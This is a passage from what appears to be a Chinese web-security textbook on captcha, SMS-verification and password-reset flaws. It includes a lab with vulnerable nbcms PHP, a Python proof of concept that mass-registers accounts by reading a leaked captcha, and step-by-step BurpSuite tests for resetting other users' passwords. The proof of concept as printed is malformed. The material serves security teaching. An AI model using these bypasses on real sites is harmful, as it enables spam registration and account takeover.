\u6709\u4E9B\u7F51\u7AD9\u7684\u53D1\u9001\u77ED\u4FE1\u6B21\u6570\u662F\u6839\u636ECookie\u503C\u8FDB\u884C\u5224\u65AD\u7684\uFF0C\u7531\u4E8E\u8BE5Cookie\u503C\u672A\u4F7F\u7528\u767B\u5F55\u72B6\u6001\u4E0B\u7684Cookie\u800C\u662F\u4F7F\u7528\u666E\u901A\u72B6\u6001\u4E0B\u7684Cookie\u3002\u56E0\u6B64\u53EF\u901A\u8FC7\u4FEE\u6539\u5F53\u524DCookie\u503C\u6765\u9A8C\u8BC1\u53D1\u9001\u6B21\u6570\u5E76\u7ED5\u8FC7\u77ED\u4FE1\u6B21\u6570\u9650\u5236\u3002\r
\r
\u56FE11-5\u4E3ABurpSuite\u62E6\u622A\u77ED\u4FE1\u6821\u9A8C\u7684\u6570\u636E\u5305\uFF0C\u5C06\u6570\u636E\u5305\u4E2D\u7684JSESSIONID\u8FDB\u884C\u4FEE\u6539\uFF0C\u5C06\u53C2\u6570\u503C\u7684node2\u4FEE\u6539\u4E3Anode3\u6D4B\u8BD5\u53D1\u9001\u6570\u636E\u5305\uFF0C\u5E76\u8FD4\u56DE\u6B63\u786E\u7684\u6570\u636E\u5305\u4ECE\u800C\u7ED5\u8FC7\u77ED\u4FE1\u6821\u9A8C\u6B21\u6570\u9650\u5236\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image514.gif)\r
\r
\u56FE11-5 \u4FEE\u6539JSESSIONID\u56FE\r
\r
\uFF087\uFF09   \u624B\u673A\u53F7\u66FF\u6362\u83B7\u53D6\u9A8C\u8BC1\u7801\r
\r
\u6709\u4E9B\u7F51\u7AD9\u5728\u4FEE\u6539\u522B\u4EBA\u7684\u4FE1\u606F\u65F6\uFF0C\u9700\u8981\u77ED\u4FE1\u8BA4\u8BC1\u3002\u5728\u53D1\u9001\u77ED\u4FE1\u65F6\uFF0C\u53EF\u4EE5\u5C1D\u8BD5\u5C06\u624B\u673A\u53F7\u66FF\u6362\u4E3A\u653B\u51FB\u8005\u7684\u6765\u83B7\u53D6\u77ED\u4FE1\u9A8C\u8BC1\u7801\u3002\u5982\u679C\u670D\u52A1\u7AEF\u53EA\u68C0\u67E5\u9A8C\u8BC1\u7801\u662F\u5426\u6B63\u786E\uFF0C\u800C\u4E0D\u8FDB\u884C\u624B\u673A\u53F7\u548C\u9A8C\u8BC1\u7801\u5339\u914D\u68C0\u6D4B\uFF0C\u653B\u51FB\u8005\u5C31\u53EF\u4EE5\u7ED5\u8FC7\u8BA4\u8BC1\u3002\r
\r
\u4F8B\u5982\uFF1A\u5728\u53D1\u9001\u77ED\u4FE1\u65F6\u62E6\u622A\u6570\u636E\u5305\uFF0C\u5C06\u624B\u673A\u53F7\u66FF\u6362\u4E3A\u653B\u51FB\u8005\u7684\u624B\u673A\u53F7\u5E76\u53D1\u9001\u3002\u7136\u540E\u518D\u8F93\u5165\u5F97\u5230\u9A8C\u8BC1\u7801\u8FDB\u884C\u9A8C\u8BC1\uFF0C\u5982\u679C\u6B64\u65F6\u9A8C\u8BC1\u7801\u6B63\u786E\uFF0C\u5373\u53EF\u7ED5\u8FC7\u3002\r
\r
### 11.1.4 \u5B9E\u9A8C\uFF1A\u9A8C\u8BC1\u7801\u529F\u80FD\u6F0F\u6D1E\u5BFC\u81F4\u4EFB\u610F\u7528\u6237\u6CE8\u518C\u5B9E\u8DF5\r
\r
\xB7 \u5B9E\u9A8C\u4ECB\u7ECD\r
\r
\u672C\u5B9E\u9A8C\u5C06\u5BF9nbcms\u8FDB\u884C\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u4F5C\uFF0C\u5BA1\u8BA1\u8BE5CMS\u4E2D\u662F\u5426\u5B58\u5728\u9A8C\u8BC1\u7801\u529F\u80FD\u6F0F\u6D1E\u3002\r
\r
\xB7 \u9884\u5907\u77E5\u8BC6\r
\r
\u53C2\u800311.1.1\u8282\uFF1A\u9A8C\u8BC1\u7801\u529F\u80FD\u4ECB\u7ECD\uFF1B11.1.2\u8282\uFF1A\u9A8C\u8BC1\u7801\u529F\u80FD\u5B89\u5168\u95EE\u9898\uFF1B11.1.3\u8282\uFF1A\u9A8C\u8BC1\u7801\u7ED5\u8FC7\u3002\r
\r
\xB7 \u5B9E\u9A8C\u76EE\u7684\r
\r
\u638C\u63E1\u9A8C\u8BC1\u7801\u529F\u80FD\u6F0F\u6D1E\u7684\u5BA1\u8BA1\u65B9\u6CD5\u3002\r
\r
\xB7 \u5B9E\u9A8C\u73AF\u5883\r
\r
Windows\u64CD\u4F5C\u7CFB\u7EDF\u4E3B\u673A\uFF1Bnbcms\u5B89\u88C5\u5305\uFF1BPhpStorm\u5DE5\u5177\u3002\r
\r
\xB7 \u5B9E\u9A8C\u6B65\u9AA4\r
\r
\uFF081\uFF09\u5BA1\u8BA1\u9636\u6BB5\r
\r
\u70B9\u51FB\u5C55\u5F00api/captcha/captcha.php\uFF0C\u4EE3\u7801\u5982\u4E0B\u3002\u7A0B\u5E8F\u6D41\u7A0B\uFF1A\r
\r
l \u4EE3\u7801\u4E3Aif(!isset($_GET['code']))\uFF0Cisset\u51FD\u6570\u7528\u6765\u5224\u65AD\u5F53\u524D\u4F20\u5165\u7684\u53D8\u91CF\u662F\u5426\u8D4B\u503C\u3002\u82E5\u8D4B\u503C\u5931\u8D25\u5219\u8C03\u7528\u4E00\u4E2A\u81EA\u5B9A\u4E49\u51FD\u6570createcaptcha()\uFF0C\u8BE5\u51FD\u6570\u529F\u80FD\u4E3A\u5224\u65AD\u5176\u7528\u6765\u751F\u6210\u9080\u8BF7\u7801\u3002\r
\r
l \u4EE3\u7801\u4E3Aif($_SESSION['captcha']==strtolower(trim($_GET['code'])))\uFF0C\u63A5\u6536GET\u4E2D\u7684code\u503C\u4E0ESESSION\u4E2D\u7684captcha\u503C\u8FDB\u884C\u6BD4\u8F83\uFF0C\u82E5\u7B49\u4E8E\u5219\u63D0\u793A\u6210\u529F\uFF0C\u82E5\u4E0D\u7B49\u4E8E\u5219\u4F1A\u628A\u7A0B\u5E8F\u7684GET\u65B9\u5F0F\u83B7\u53D6\u7684code\u503C\u548CSESSION\u4E2D\u7684\u9A8C\u8BC1\u7801\u503C\u6253\u5370\u51FA\u6765\u3002\u6253\u5370\u7684\u5185\u5BB9\u5C06\u5BFC\u81F4\u7528\u6237\u53EF\u4EE5\u5229\u7528\u8BE5\u63D0\u793A\u6279\u91CF\u6CE8\u518C\u7528\u6237\u3002\r
\r
\r
\r
\`\`\`\r
<?php\r
   include substr(dirname(__FILE__),0,-12).'/include/common.inc.php';\r
//\u5224\u65ADcode\u662F\u5426\u8BBE\u7F6E\u503C\r
   if(!isset($_GET['code']))\r
   {createcaptcha();//\u82E5\u672A\u8BBE\u7F6E\u5219\u8C03\u7528createcaptcha\u51FD\u6570}\r
   else{\r
if($_SESSION['captcha']==strtolower(trim($_GET['code'])))\r
{exit('ok');//\u82E5code\u503C\u4E0ESESSION\u4E2D\u7684captcha\u503C\u8FDB\u884C\u6BD4\u8F83\uFF0C\u82E5\u7B49\u4E8E\u5219\u63D0\u793A\u6210\u529F}\r
     else{exit('error'.$_GET['code'].'-'.$_SESSION['captcha']);}\r
}\r
?>\r
\`\`\`\r
\r
\r
\r
  \u8BF7\u6C42\u8DEF\u5F84\u4E3Ahttp://ip/nbcms/api/captcha/captcha.php\u83B7\u5F97\u7F51\u7AD9\u7684\u9A8C\u8BC1\u7801\u56FE\u7247\uFF0C\u5982\u56FE11-6\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image516.gif)\r
\r
\u56FE11-6 \u83B7\u53D6\u7F51\u7AD9\u9A8C\u8BC1\u7801\u56FE\r
\r
\u8BF7\u6C42\u8DEF\u5F84\u4E3Ahttp://ip/nbcms/api/captcha/captcha.php?code=123\u83B7\u5F97\u7F51\u7AD9\u7684code\u503C\u4E0E\u9A8C\u8BC1\u7801\u56FE\u7247\u503C\uFF0C\u5F62\u5F0F\u4E3A\u201Cerror code-\u9A8C\u8BC1\u7801\u201D\uFF0C\u5982\u56FE11-7\u6240\u793A\u3002\u800C\u89E3\u6790\u5F97\u5230\u7684\u9A8C\u8BC1\u7801\u53EF\u7528\u6765\u76F4\u63A5\u6CE8\u518C\u65B0\u7528\u6237\u5BFC\u81F4\u4EFB\u610F\u7528\u6237\u6CE8\u518C\u6F0F\u6D1E\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image518.gif)\r
\r
\u56FE11-7 code\u503C\u4E0E\u9A8C\u8BC1\u7801\u56FE\r
\r
\uFF082\uFF09\u5229\u7528\u9636\u6BB5\r
\r
\u56FE11-8\u4E3A\u8BE5CMS\u5229\u7528\u6D41\u7A0B\u56FE\uFF0C\u9996\u5148\u901A\u8FC7\u53D1\u9001\u8BF7\u6C42/api/captcha/captcha.php?code=123\u89E3\u6790\u51FA\u9A8C\u8BC1\u7801\uFF0C\u7136\u540E\u4F7F\u7528\u89E3\u6790\u7684\u9A8C\u8BC1\u7801\u53CA\u7528\u6237\u5176\u4ED6\u4FE1\u606F\u6784\u9020\u6CE8\u518C\u7528\u6237\u6570\u636E\u53D1\u9001\u8BF7\u6C42\u81F3/member/index.php?file=login&modelid=1&action=register1\uFF0C\u521B\u5EFA\u65B0\u7528\u6237\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image520.jpg)\r
\r
\u56FE11-8 \u6F0F\u6D1E\u5229\u7528\u6D41\u7A0B\u56FE\r
\r
\u4F7F\u7528\u7684\u81EA\u52A8\u6CE8\u518C\u7528\u6237POC\u5982\u4E0B\uFF1A\r
\r
\r
\r
\\# coing=utf-8\r
\r
\u200B    import requests,random\r
\r
\u200B    def reg(urls,i):\r
\r
\u200B     url = urls+'**/api/captcha/captcha.php**'    //\u53D1\u9001\u7684\u7B2C\u4E00\u4E2A\u8BF7\u6C42url\r
\r
\u200B     **one = requests.get(url)          //****\u7B2C\u4E00\u4E2A\u8BF7\u6C42\u8FD4\u56DE\u5B9A\u4E49\u4E3Aone**\r
\r
\u200B      url1 = urls+'**/api/captcha/captcha.php?code=123**'//\u53D1\u9001\u7684\u7B2C\u4E8C\u4E2A\u8BF7\u6C42url\r
\r
\u200B      headers = {              //\u5B9A\u4E49HTTP\u8BF7\u6C42\u5934\u4E3Aheaders\u53D8\u91CF\r
\r
\u200B     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',\r
\r
\u200B     'Content-Type': 'application/x-www-FORM-urlencoded',\r
\r
\u200B      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',\r
\r
\u200B     'Cookie': one.headers['Set-Cookie']}\r
\r
\u200B    **two = requests.get(url1,headers=headers)//****\u53D1\u9001\u7B2C\u4E8C\u4E2A\u8BF7\u6C42\u8FD4\u56DE\u5B9A\u4E49\u4E3Atwo**\r
\r
\u200B    **code = str(two.text).split('error123-')[1]//****\u8BF7\u6C42\u8FD4\u56DEtwo\u5F97\u5230\u9A8C\u8BC1\u7801code**\r
\r
\u200B    **url2 = urls+'/member/index.php?file=login&modelid=1&action=register1'**\r
\r
\u200B                 **//\u53D1\u9001\u7684\u7B2C\u4E09\u4E2A\u8BF7\u6C42url2\uFF0C\u7528\u4E8E\u6CE8\u518C\u65B0\u7528\u6237\u7684\u8BF7\u6C42**\r
\r
\u200B    name = str("anhoulin")+str(i)//\u5B9A\u4E49\u7528\u6237\u540D\r
\r
\u200B    data = {                    //\u5B9A\u4E49\u53D1\u9001\u8BF7\u6C42\u7684\u8BF7\u6C42\u4F53\r
\r
\u200B        'do_submit':'1',\r
\r
\u200B        'modelid':'1',\r
\r
\u200B        'username':name,\r
\r
\u200B        'email':str(name)+str('@qq.com'),\r
\r
\u200B        'password':'123123A',\r
\r
\u200B        'password2':'123123A',\r
\r
\u200B        'inputcheckcode':code,\r
\r
\u200B      }\r
\r
\u200B    **three = requests.post(url2,data=data,headers=headers) //****\u53D1\u9001\u8BF7\u6C42url2**\r
\r
\u200B    if str(three.text).find('\u6CE8\u518C\u6210\u529F\uFF01') != -1:  //\u5224\u65AD\u662F\u5426\u663E\u793A\u6CE8\u518C\u6210\u529F\r
\r
\u200B      return "\u8D26\u6237\uFF1A"+str(name)+'<=====>\u5BC6\u7801\uFF1A123456A'//\u663E\u793A\u6CE8\u518C\u7528\u6237\u5BC6\u7801\r
\r
\u200B    else:\r
\r
\u200B      return "\u6CE8\u518C\u5931\u8D25\uFF01"               //\u663E\u793A\u6CE8\u518C\u5931\u8D25\r
\r
\u200B    if __name__ == "__main__":\r
\r
\u200B      for i in range(1,50):\r
\r
\u200B        content = reg(r"http://www.tp.cc",i)\r
\r
\u200B        print(content)\r
\r
\r
\r
## 11.2 \u5BC6\u7801\u91CD\u7F6E\u529F\u80FD\u6F0F\u6D1E\r
\r
### 11.2.1 \u5BC6\u7801\u91CD\u7F6E\u529F\u80FD\u4ECB\u7ECD\r
\r
\u7F51\u7AD9\u4E2D\u5BC6\u7801\u91CD\u7F6E\u6F0F\u6D1E\u51FA\u73B0\u7684\u529F\u80FD\u70B9\u4E3B\u8981\u5305\u62EC\u4EE5\u4E0B\u5F62\u5F0F\uFF1A\r
\r
l \u7F51\u7AD9\u4E2D\u7684\u4E2A\u4EBA\u670D\u52A1\u4E2D\u5FC3\u4E2D\u4FEE\u6539\u5BC6\u7801\u8FDB\u884C\u91CD\u7F6E\u3002\r
\r
l \u7F51\u7AD9\u4E2D\u81EA\u5E26\u7684\u5FD8\u8BB0\u5BC6\u7801\u627E\u56DE\u529F\u80FD\u8FDB\u884C\u5BC6\u7801\u91CD\u7F6E\u3002\r
\r
\u5BC6\u7801\u627E\u56DE\u529F\u80FD\u7531\u4E8E\u5176\u4EA4\u4E92\u6D41\u7A0B\u8FC7\u591A\uFF0C\u5BFC\u81F4\u5176\u662F\u51FA\u73B0\u6F0F\u6D1E\u6700\u591A\u7684\u529F\u80FD\u70B9\u3002\u627E\u56DE\u5BC6\u7801\u7684\u65B9\u5F0F\u6BD4\u8F83\u5E38\u89C1\u7684\u6709\u624B\u673A\u9A8C\u8BC1\u7801\u3001\u90AE\u7BB1\u9A8C\u8BC1\u7801\u7B49\uFF0C\u5176\u4E3B\u8981\u6D41\u7A0B\u5982\u56FE11-9\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image522.jpg)\r
\r
\u56FE11-9 \u5BC6\u7801\u627E\u56DE\u6D41\u7A0B\u56FE\r
\r
\u7F51\u7AD9\u4E2D\u7684\u5BC6\u7801\u91CD\u7F6E\u529F\u80FD\u672C\u8EAB\u4E0D\u5B58\u5728\u6F0F\u6D1E\uFF0C\u4F46\u5982\u679C\u5BF9\u5BC6\u7801\u91CD\u7F6E\u529F\u80FD\u7684\u9A8C\u8BC1\u673A\u5236\u4E0D\u591F\u5B8C\u5584\u5C06\u5F62\u6210\u5BC6\u7801\u91CD\u7F6E\u6F0F\u6D1E\uFF0C\u5E38\u89C1\u7684\u6F0F\u6D1E\u5F62\u5F0F\u5305\u62EC\uFF1A\r
\r
l \u9A8C\u8BC1\u7801\u8F83\u5F31\uFF1B\r
\r
l \u5BC6\u7801\u51ED\u8BC1\u53EF\u4EE5\u4ECE\u5BA2\u6237\u7AEF\u83B7\u53D6\uFF1B\r
\r
l \u51ED\u8BC1\u6613\u88AB\u62C6\u89E3\uFF1B\r
\r
l \u5229\u7528\u5DF2\u77E5\u90AE\u7BB1\u6216\u624B\u673A\u53F7\u91CD\u7F6E\u5176\u4ED6\u7528\u6237\u5BC6\u7801\uFF1B\r
\r
l \u53D1\u9001\u5BC6\u7801\u9636\u6BB5\u53EF\u4FEE\u6539\u5176\u4ED6\u7528\u6237\u5BC6\u7801\u3002\r
\r
### 11.2.2 \u5BC6\u7801\u91CD\u7F6E\u529F\u80FD\u7684\u5E38\u89C1\u6848\u4F8B\r
\r
\uFF081\uFF09 \u9A8C\u8BC1\u7801\u4E0D\u5931\u6548\u5BFC\u81F4\u5BC6\u7801\u91CD\u7F6E\r
\r
\u7F51\u7AD9\u4E2D\u627E\u56DE\u5BC6\u7801\u65F6\u83B7\u53D6\u7684\u9A8C\u8BC1\u7801\u4EC5\u7528\u4E8E\u5224\u65AD\u662F\u5426\u6B63\u786E\uFF0C\u800C\u7F3A\u5C11\u5224\u65AD\u9A8C\u8BC1\u7801\u662F\u5426\u8FC7\u671F\u7684\u65F6\u95F4\u9650\u5236\u3002\u8FD9\u5C06\u5BFC\u81F4\u653B\u51FB\u8005\u53EF\u8FDB\u884C\u7206\u7834\u627E\u5230\u6B63\u786E\u7684\u9A8C\u8BC1\u7801\uFF0C\u5BF9\u7528\u6237\u5BC6\u7801\u91CD\u7F6E\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image524.jpg)\r
\r
\u56FE11-10 \u9A8C\u8BC1\u7801\u6821\u9A8C\u6D41\u7A0B\u56FE\r
\r
\u5982\u56FE11-10\u4E3A\u9A8C\u8BC1\u7801\u6821\u9A8C\u57FA\u672C\u6D41\u7A0B\u56FE\uFF0C\u653B\u51FB\u8005\u5BF9\u9A8C\u8BC1\u7801\u8FDB\u884C\u6821\u9A8C\u7684\u6570\u636E\u5305\u8FDB\u884C\u62E6\u622A\uFF0C\u5E76\u4F7F\u7528BurpSuite\u8FDB\u884C\u66B4\u529B\u7834\u89E3\uFF0C\u53CD\u590D\u6267\u884C\u4E0A\u8FF0\u6D41\u7A0B\u6700\u7EC8\u83B7\u5F97\u6B63\u786E\u7684\u9A8C\u8BC1\u7801\u3002\r
\r
\uFF082\uFF09 \u9A8C\u8BC1\u7801\u76F4\u63A5\u8FD4\u56DE\r
\r
\u7F51\u7AD9\u4E2D\u8F93\u5165\u624B\u673A\u53F7\u540E\u70B9\u51FB\u83B7\u53D6\u9A8C\u8BC1\u7801\uFF0C\u9A8C\u8BC1\u7801\u5728\u5BA2\u6237\u7AEF\u751F\u6210\uFF0C\u5E76\u76F4\u63A5\u8FD4\u56DE\u54CD\u5E94\u6570\u636E\u5305\uFF08\u8BE5\u6570\u636E\u5305\u4E2D\u5B58\u5728\u9A8C\u8BC1\u7801\uFF09\u4EE5\u4FBF\u5BF9\u6BD4\u9A8C\u8BC1\u7801\u3002\u653B\u51FB\u8005\u53EF\u901A\u8FC7\u62E6\u622A\u54CD\u5E94\u6570\u636E\u5305\u76F4\u63A5\u83B7\u5F97\u6B63\u786E\u7684\u9A8C\u8BC1\u7801\u4ECE\u800C\u8FDB\u884C\u5BC6\u7801\u91CD\u7F6E\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image526.jpg)\r
\r
\u56FE11-11 \u9A8C\u8BC1\u7801\u83B7\u53D6\u6D41\u7A0B\u56FE\r
\r
\u56FE11-11\u4E3A\u9A8C\u8BC1\u7801\u83B7\u53D6\u57FA\u672C\u6D41\u7A0B\u56FE\uFF0C\u5176\u6D4B\u8BD5\u65B9\u6CD5\u662F\uFF1A\u76F4\u63A5\u8F93\u5165\u76EE\u6807\u624B\u673A\u53F7\uFF0C\u70B9\u51FB\u83B7\u53D6\u9A8C\u8BC1\u7801\uFF0C\u5E76\u89C2\u5BDF\u8FD4\u56DE\u5305\u5373\u53EF\u3002\u5728\u8FD4\u56DE\u5305\u4E2D\u5F97\u5230\u76EE\u6807\u624B\u673A\u53F7\u83B7\u53D6\u7684\u9A8C\u8BC1\u7801\uFF0C\u8FDB\u800C\u5B8C\u6210\u9A8C\u8BC1\uFF0C\u91CD\u7F6E\u5BC6\u7801\u6210\u529F\u3002\r
\r
\uFF083\uFF09 \u9A8C\u8BC1\u7801\u672A\u7ED1\u5B9A\u7528\u6237\r
\r
\u7F51\u7AD9\u4E2D\u8F93\u5165\u624B\u673A\u53F7\u548C\u9A8C\u8BC1\u7801\u8FDB\u884C\u91CD\u7F6E\u5BC6\u7801\u65F6\uFF0C\u4EC5\u5224\u65AD\u9A8C\u8BC1\u7801\u662F\u5426\u6B63\u786E\u8FDB\uFF0C\u800C\u672A\u5BF9\u9A8C\u8BC1\u7801\u662F\u5426\u4E0E\u624B\u673A\u53F7\u5339\u914D\u8FDB\u884C\u6821\u9A8C\uFF0C\u56FE11-12\u4E3A\u9A8C\u8BC1\u7801\u9A8C\u8BC1\u6D41\u7A0B\u56FE\u3002\r
\r
\u6D4B\u8BD5\u65B9\u6CD5\uFF1A\u5728\u63D0\u4EA4\u624B\u673A\u53F7\u548C\u9A8C\u8BC1\u7801\u65F6\uFF0C\u66FF\u6362\u624B\u673A\u53F7\u4E3A\u4ED6\u4EBA\u624B\u673A\u53F7\u8FDB\u884C\u6D4B\u8BD5\uFF0C\u6210\u529F\u901A\u8FC7\u9A8C\u8BC1\u5E76\u91CD\u7F6E\u4ED6\u4EBA\u5BC6\u7801\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image528.jpg)\r
\r
\u56FE11-12 \u9A8C\u8BC1\u7801\u9A8C\u8BC1\u6D41\u7A0B\u56FE\r
\r
\uFF084\uFF09 \u8DF3\u8FC7\u9A8C\u8BC1\u6B65\u9AA4\u4FEE\u6539\u5BC6\u7801\r
\r
\u7F51\u7AD9\u4E2D\u5BF9\u4FEE\u6539\u5BC6\u7801\u7684\u6B65\u9AA4\u672A\u8FDB\u884C\u6821\u9A8C\uFF0C\u5BFC\u81F4\u53EF\u4EE5\u76F4\u63A5\u8F93\u5165\u6700\u7EC8\u4FEE\u6539\u5BC6\u7801\u7684\u7F51\u5740\uFF0C\u76F4\u63A5\u8DF3\u8F6C\u5230\u8BE5\u9875\u9762\uFF0C\u6700\u540E\u8F93\u5165\u65B0\u5BC6\u7801\u8FBE\u5230\u91CD\u7F6E\u5BC6\u7801\u7684\u76EE\u7684\u3002\r
\r
\u6D4B\u8BD5\u65B9\u6CD5\uFF1A\u9996\u5148\u4F7F\u7528\u81EA\u5DF1\u7684\u8D26\u53F7\u5BF9\u5BC6\u7801\u91CD\u7F6E\u6D41\u7A0B\u8FDB\u884C\u6D4B\u8BD5\uFF0C\u83B7\u5F97\u8BE5\u6D41\u7A0B\u4E2D\u6BCF\u4E2A\u6B65\u9AA4\u7684\u94FE\u63A5\u3002\u7136\u540E\u8BB0\u5F55\u9875\u9762\u4E2D\u5BF9\u5E94\u7684\u8F93\u5165\u65B0\u5BC6\u7801\u94FE\u63A5\uFF0C\u4F8B\u5982\uFF1Ahttps://xxx/page/login/veifyAccess.html?username=anhl&email=anhl@xxx.com.cn\uFF0C\u91CD\u7F6E\u4ED6\u4EBA\u7528\u6237\u65F6\uFF0C\u83B7\u5F97\u9A8C\u8BC1\u7801\u540E\uFF0C\u76F4\u63A5\u8F93\u5165\u9875\u9762\u94FE\u63A5\u5230\u65B0\u5BC6\u7801\u7684\u754C\u9762\uFF0C\u91CD\u7F6E\u5BC6\u7801\u6210\u529F\uFF0C\u5982\u56FE11-13\u4E3A\u8DF3\u8FC7\u9A8C\u8BC1\u6B65\u9AA4\u4FEE\u6539\u5BC6\u7801\u7684\u6D41\u7A0B\u56FE\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image530.jpg)\r
\r
\u56FE11-13 \u4FEE\u6539\u5BC6\u7801\u6D41\u7A0B\u56FE1\r
\r
\uFF085\uFF09 \u672A\u6821\u9A8C\u7528\u6237\u5B57\u6BB5\u7684\u503C\r
\r
\u5728\u6574\u4E2A\u91CD\u7F6E\u5BC6\u7801\u6D41\u7A0B\u4E2D\uFF0C\u53EA\u5BF9\u9A8C\u8BC1\u7801\u548C\u624B\u673A\u53F7\u505A\u4E86\u6821\u9A8C\uFF0C\u672A\u5BF9\u540E\u9762\u8BBE\u7F6E\u65B0\u5BC6\u7801\u7684\u7528\u6237\u8EAB\u4EFD\u505A\u5224\u65AD\uFF0C\u5BFC\u81F4\u5728\u6700\u540E\u4E00\u6B65\u901A\u8FC7\u4FEE\u6539\u7528\u6237\u8EAB\u4EFD\u6765\u91CD\u7F6E\u4ED6\u4EBA\u5BC6\u7801\u3002\r
\r
\u6D4B\u8BD5\u65B9\u6CD5\uFF1A\u4F7F\u7528\u81EA\u5DF1\u7684\u624B\u673A\u53F7\u6D4B\u8BD5\u4FEE\u6539\u5BC6\u7801\u6D41\u7A0B\uFF0C\u5728\u6700\u540E\u4E00\u6B65\u8BBE\u7F6E\u5BC6\u7801\u65F6\uFF0C\u9875\u9762\u53C2\u6570\u53EA\u6709\u7528\u6237\u540D\u548C\u5BC6\u7801\u4E14Cookie\u503C\u65E0\u6548\uFF0C\u53EA\u9700\u8981\u4FEE\u6539\u6570\u636E\u5305\u91CC\u7684\u7528\u6237\u4FE1\u606F\uFF0C\u5C31\u53EF\u4EE5\u91CD\u7F6E\u5BC6\u7801\uFF0C\u56FE11-14\u4E3A\u7F3A\u5C11\u8EAB\u4EFD\u5224\u65AD\u800C\u4FEE\u6539\u5BC6\u7801\u7684\u6D41\u7A0B\u56FE\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image532.jpg)\r
\r
\u56FE11-14 \u4FEE\u6539\u5BC6\u7801\u6D41\u7A0B\u56FE2\r
\r
\uFF086\uFF09 \u4FEE\u6539\u5BC6\u7801\u5904id\u53EF\u88AB\u66FF\u6362\r
\r
\u5728\u6574\u4E2A\u91CD\u7F6E\u5BC6\u7801\u6D41\u7A0B\u4E2D\uFF0C\u6CA1\u6709\u5BF9\u539F\u5BC6\u7801\u8FDB\u884C\u5224\u65AD\uFF0C\u4E14\u6839\u636Eid\u7684\u503C\u6765\u4FEE\u6539\u7528\u6237\u7684\u5BC6\u7801\uFF0C\u7C7B\u4F3C\u7684SQL\u8BED\u53E5\u4E3A\uFF1Aupdate user set password=\u201Dqwer1234\u201D where id = \u20181\u2019\u3002\u4FEE\u6539\u6570\u636E\u5305\u91CC\u7684id\u503C\u5373\u53EF\u4FEE\u6539\u4ED6\u4EBA\u7684\u5BC6\u7801\u3002\u5982\u56FE11-15\u4E3A\u4FEE\u6539\u5BC6\u7801\u5904id\u7684\u57FA\u672C\u6D41\u7A0B\u56FE\u3002\r
\r
\u6D4B\u8BD5\u65B9\u6CD5\uFF1A\u4F7F\u7528BurpSuite\u6293\u53D6\u4FEE\u6539\u81EA\u5DF1\u7528\u6237\u5BC6\u7801\u7684\u6570\u636E\u5305\uFF0C\u66FF\u6362\u6570\u636E\u5305\u4E2D\u7528\u6237\u5BF9\u5E94\u7684id\u503C\uFF0C\u5373\u53EF\u4FEE\u6539\u4ED6\u4EBA\u7684\u5BC6\u7801\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image534.jpg)\r
\r
\u56FE11-15 \u4FEE\u6539\u5BC6\u7801\u5904id\u6D41\u7A0B\u56FE\r
\r
\uFF087\uFF09 Cookie\u503C\u66FF\u6362\r
\r
\u5728\u6574\u4E2A\u91CD\u7F6E\u5BC6\u7801\u6D41\u7A0B\u4E2D\uFF0C\u91CD\u7F6E\u5BC6\u7801\u6700\u540E\u6B65\u9AA4\u65F6\u4EC5\u5224\u65AD\u552F\u4E00\u7684\u7528\u6237\u6807\u8BC6Cookie\u662F\u5426\u5B58\u5728\uFF0C\u5E76\u6CA1\u6709\u5224\u65AD\u8BE5Cookie\u6709\u6CA1\u6709\u901A\u8FC7\u4E4B\u524D\u91CD\u7F6E\u5BC6\u7801\u8FC7\u7A0B\u7684\u9A8C\u8BC1\uFF0C\u8FD9\u5BFC\u81F4\u653B\u51FB\u8005\u53EF\u901A\u8FC7\u66FF\u6362Cookie\u7684\u65B9\u5F0F\u91CD\u7F6E\u4ED6\u4EBA\u7528\u6237\u5BC6\u7801\uFF0C\u6D41\u7A0B\u56FE\u5982\u56FE11-16\u6240\u793A\u3002\r
\r
\u6D4B\u8BD5\u65B9\u6CD5\uFF1A\u91CD\u7F6E\u81EA\u5DF1\u7528\u6237\u5BC6\u7801\u5230\u8FBE\u6700\u540E\u9636\u6BB5\u5E76\u6293\u53D6\u6570\u636E\u5305\uFF0C\u5728\u7B2C\u4E00\u9636\u6BB5\u83B7\u53D6\u76EE\u6807\u7528\u6237Cookie\u540E\uFF0C\u66FF\u6362Cookie\u5230\u5DF2\u7ECF\u6293\u53D6\u7684\u6570\u636E\u5305\u4E2D\uFF0C\u5E76\u8FDB\u884C\u53D1\u5305\u6D4B\u8BD5\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image536.jpg)\r
\r
\u56FE11-16 \u4FEE\u6539\u5BC6\u7801\u5904id\u6D41\u7A0B\u56FE\r
\r
\u4E0B\u9762\u7ED9\u51FA\u901A\u8FC7\u66FF\u6362Cookie\u503C\u6765\u4FEE\u6539\u5176\u4ED6\u7528\u6237\u5BC6\u7801\u7684\u6848\u4F8B\uFF0C\u5982\u56FE11-17\u6240\u793A\u3002\u9996\u5148\u901A\u8FC7\u5BC6\u7801\u627E\u56DE\u529F\u80FD\u83B7\u53D6\u7528\u6237wangshuai\u7684Cookie\u503C\uFF0C\u6293\u53D6\u8BE5\u7528\u6237\u6570\u636E\u5305\u7684Cookie\u503C\u4E3AJSESSIONID=E1AC27A7302C03C9432DE2254B99311A\u3002\r
\r
